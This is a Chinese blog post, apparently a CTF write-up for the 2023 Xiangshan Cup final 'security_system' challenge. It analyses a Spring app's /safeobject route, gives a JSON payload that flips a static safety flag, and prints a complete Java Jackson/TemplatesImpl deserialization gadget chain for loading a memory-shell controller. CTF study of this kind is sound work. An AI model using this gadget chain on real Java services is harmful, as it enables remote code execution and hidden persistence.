@@ -1,0 +1,367 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>[2023香山杯决赛]security_system | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="[2023香山杯决赛]security_system | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="题目环境
+感谢大头哥复现的环境🙏：[CTF复现计划]2023香山杯决赛 security system
+题目分析
+反编译jar包，内容结构很简单，就一个/safeobject路由。
+@RequestMapping({&quot;/safe..." />
+    <meta name="keywords" content="内存马,Java反序列化,CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    Welcome to Internet
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              [2023香山杯决赛]security_system
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-12-31
+              </span>
+              <span>
+                6 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/37Irvvniz/" class="post-tag">
+                  # 内存马
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/VnhegNlf7/" class="post-tag">
+                  # Java反序列化
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/b7GKYdjmj/" class="post-tag">
+                  # CTF
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/2023-xiang-shan-bei-jue-sai-security_system.jpg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="题目环境">题目环境</h1>
+<p>感谢大头哥复现的环境🙏：<a href="https://mp.weixin.qq.com/s/nlTfCG6-9JAUT1ESMdH3Zg">[CTF复现计划]2023香山杯决赛 security system</a></p>
+<h1 id="题目分析">题目分析</h1>
+<p>反编译jar包，内容结构很简单，就一个<code>/safeobject</code>路由。</p>
+<pre><code class="language-java">@RequestMapping({&quot;/safeobject&quot;})
+public String start(String obj, String classes) throws Exception {
+    if (!classes.contains(&quot;Object&quot;) &amp;&amp; !classes.contains(&quot;LinkedHashMap&quot;)) {
+        Class c = Class.forName(classes);
+        SecurityCheck var10000 = isSafe;
+        if (SecurityCheck.isSafe()) {
+            Object o = SecurityCheck.deObject(mapper.readValue(obj, c));
+            return o.toString();
+        } else {
+            StringBuilder sb = new StringBuilder();
+            var10000 = isSafe;
+            Iterator var5 = SecurityCheck.ismap().iterator();
+
+            while(var5.hasNext()) {
+                Object item = var5.next();
+                byte[] s = SecurityCheck.base64Decode((String)item);
+                sb.append(SecurityCheck.deserialize(s));
+            }
+
+            return sb.toString();
+        }
+    } else {
+        return &quot;error&quot;;
+    }
+}
+</code></pre>
+<p>根据<code>mapper.readValue(obj, c)</code>的注释猜测，这是一个解析Json字符串的函数，第二个参数似乎是要转换的类型。根据后面的流程，这里应该是要将Json转为一个map类型的对象。</p>
+<p><code>SecurityCheck.deObject</code>操作的是<code>mapper.readValue(obj, c)</code>解析出的map，它会将map中<code>@type</code>所指的类实例化成一个对象，然后用map剩下的键值对来修改这个对象的属性，最后返回这个对象。</p>
+<pre><code class="language-java">public static Object deObject(Object ob) throws Exception {
+    if (ob instanceof LinkedHashMap) {
+        LinkedHashMap map = (LinkedHashMap)ob;
+        String type = (String)map.get(&quot;@type&quot;);
+        if (!&quot;&quot;.equals(type) &amp;&amp; type != null) {
+            Class clazz = Class.forName(type);
+            Object obj = clazz.newInstance();
+            Iterator ir = map.keySet().iterator();
+
+            while(ir.hasNext()) {
+                String key = (String)ir.next();
+                Object value = map.get(key);
+                if (!key.equals(&quot;@type&quot;)) {
+                    Field field = getField(clazz, key);
+                    if (field != null) {
+                        setFieldValues(obj, key, value);
+                    }
+                }
+            }
+
+            return obj;
+        } else {
+            return map;
+        }
+    } else {
+        return ob;
+    }
+}
+</code></pre>
+<p>�<br>
+注意到这个返回的对象在<code>start</code>中会直接调用它的<code>toString</code>方法，这里似乎可以直接衔接到JackSon反序列化的<code>POJONode</code>。但这里在实例化<code>clazz</code>的时候调用的是它的无参构造方法，而<code>POJONode</code>只有有参的，所以这个方法会在实例化<code>POJONode</code>的时候失败。</p>
+<p>这里要用else的部分打，<code>SecurityCheck.deObject()</code>也可以修改<code>SecurityCheck</code>中的静态变量。所以思路就很明确了</p>
+<ul>
+<li>第一次请求在 if 部分修改<code>SecurityCheck</code>的<code>safe</code>为<code>false</code>，<code>treeMap</code>包含恶意的反序列化字符串。</li>
+<li>第二次请求在 else 部分将<code>treeMap</code>中的内容取出触发反序列化。</li>
+</ul>
+<h1 id="解题流程">解题流程</h1>
+<p>因为classes不能为LinkedHashMap，所以选取一个LinkedHashMap的子类，这里选择的是<code>org.springframework.ui.ModelMap</code></p>
+<p>然后是<code>obj</code>的构造，唯一要思考的就是用来替换<code>treeMap</code>的值怎么写。虽然JSON用来表示Set的写法是<code>[&quot;content&quot;]</code>，但是这里只能被解析为ArrayList，无法被替换。</p>
+<p>注意到这里的<code>setFieldValues</code>的写法是</p>
+<pre><code class="language-java">public static void setFieldValues(Object obj, String fieldName, Object fieldValue) {
+    try {
+        setFieldValue(obj, fieldName, deObject(fieldValue));
+    } catch (Exception var4) {
+        System.out.println(var4);
+    }
+
+}
+</code></pre>
+<p>这里对修改的fieldValue又调用了一次<code>deObject</code>，有一点绕，不过这样让我们可以直接实例化一个HashSet来替换。另外，简单记一下Set中存储值的是一个map的Key，value可以不用管（感觉之前CC链好像见过...）<br>
+<img src="https://skyblu3519.github.io/post-images/1703959074081.png" alt="" loading="lazy"></p>
+<p>所以payload构造为</p>
+<pre><code>obj={&quot;@type&quot;:&quot;com.example.jackson.SecurityCheck&quot;,&quot;treeMap&quot;:{&quot;@type&quot;:&quot;java.util.HashSet&quot;,&quot;map&quot;:{&quot;反序列化的字符串&quot;:&quot;&quot;}},&quot;safe&quot;:false}&amp;classes=org.springframework.ui.ModelMap
+</code></pre>
+<p>反序列化的链子选择JackSon那条（稳定版），用它来打一个刚学到的Controller内存马</p>
+<pre><code class="language-java">package yso.json.Jackson;
+
+import com.fasterxml.jackson.databind.node.POJONode;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.CtMethod;
+import org.apache.commons.codec.binary.Base64;
+import org.springframework.aop.framework.AdvisedSupport;
+
+import javax.management.BadAttributeValueExpException;
+import javax.xml.transform.Templates;
+import java.io.*;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+
+public class Exp {
+    public static void main(String[] args) throws Exception{
+        byte[] bytecode = Files.readAllBytes(Paths.get(&quot;./target/classes/SpControllerExploit2.class&quot;));       // Evil bytecode
+        byte[][] bytecodes = {bytecode};
+        TemplatesImpl templates = TemplatesImpl.class.newInstance();
+        setValue(templates, &quot;_bytecodes&quot;, bytecodes);
+        setValue(templates, &quot;_name&quot;, &quot;xx&quot;);
+        setValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+
+        // 使用JdkDynamicAopProxy稳定调用
+        Class&lt;?&gt; clazz = Class.forName(&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;);
+        Constructor&lt;?&gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class);
+        cons.setAccessible(true);
+        AdvisedSupport advisedSupport = new AdvisedSupport();
+        advisedSupport.setTarget(templates);
+        InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport);
+        Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]{Templates.class}, handler);
+
+        // 删除 jsonNode 的 writeReplace
+        try {
+            ClassPool _pool = ClassPool.getDefault();
+            CtClass jsonNode = _pool.get(&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;);
+            CtMethod writeReplace = jsonNode.getDeclaredMethod(&quot;writeReplace&quot;);
+            jsonNode.removeMethod(writeReplace);
+            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
+            jsonNode.toClass(classLoader, null);
+        } catch (Exception e) {
+        }
+
+        POJONode node = new POJONode(proxyObj);
+        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
+        Field valfield = val.getClass().getDeclaredField(&quot;val&quot;);
+        valfield.setAccessible(true);
+        valfield.set(val, node);
+
+        String s = serializeToBase64(val);
+        System.out.println(s);
+//        deserializeFromBase64(s);
+    }
+    public static void setValue(Object instance, String fieldName, Object value) throws NoSuchFieldException, IllegalAccessException {
+        Field field = instance.getClass().getDeclaredField(fieldName); // 获取私有字段
+        field.setAccessible(true);  // 设置为可访问
+        field.set(instance, value); // 为字段设置新值
+    }
+    public static Object deserializeFromBase64(String base64String) throws IOException, ClassNotFoundException {
+//        byte[] data = Base64.getDecoder().decode(base64String);
+        byte[] data = Base64.decodeBase64(base64String);
+        try (ByteArrayInputStream bais = new ByteArrayInputStream(data);
+             ObjectInputStream ois = new ObjectInputStream(bais)) {
+
+            return ois.readObject();
+        }
+    }
+
+    public static String serializeToBase64(Object obj) throws IOException {
+        try (ByteArrayOutputStream baos = new ByteArrayOutputStream();
+             ObjectOutputStream oos = new ObjectOutputStream(baos)) {
+
+            oos.writeObject(obj);
+            oos.flush();
+
+//            return Base64.getEncoder().encodeToString(baos.toByteArray());
+            return org.apache.commons.codec.binary.Base64.encodeBase64String(baos.toByteArray());
+        }
+    }
+}
+</code></pre>
+<p>读取flag~<br>
+<img src="https://skyblu3519.github.io/post-images/1703959089265.png" alt="" loading="lazy"></p>
+<h1 id="修复">修复</h1>
+<p>过滤一下@type</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E9%A2%98%E7%9B%AE%E7%8E%AF%E5%A2%83">题目环境</a></li>
+<li><a href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90">题目分析</a></li>
+<li><a href="#%E8%A7%A3%E9%A2%98%E6%B5%81%E7%A8%8B">解题流程</a></li>
+<li><a href="#%E4%BF%AE%E5%A4%8D">修复</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/spring-controllerinterceptor-nei-cun-ma/">
+              <h3 class="post-title">
+                Spring Controller/Interceptor 内存马
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
